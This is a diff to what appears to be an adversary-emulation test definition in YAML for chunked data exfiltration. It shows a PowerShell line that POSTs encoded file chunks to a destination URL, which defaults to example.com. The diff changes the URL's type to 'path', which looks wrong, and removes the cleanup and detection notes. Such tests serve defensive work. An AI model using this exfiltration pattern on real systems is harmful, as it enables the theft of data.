@@ -44,7 +44,7 @@ atomic_tests:
       default: "[User specified]"
     destination_url:
       description: "URL of the destination server."
-      type: "string"
+      type: "path"
       default: "http://example.com"
     chunk_size:
       description: "Size of each data chunk (in KB)."
@@ -63,8 +63,3 @@ atomic_tests:
           Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
       }
       $file.Close()
-  cleanup_commands:
-    - "No cleanup required as this script does not create files or modify system state."
-  detection:
-    - "Monitor for frequent small POST requests to the same destination URL."
-    - "Analyze network traffic for repeated connections and data transfers that are unusually small and fragmented."
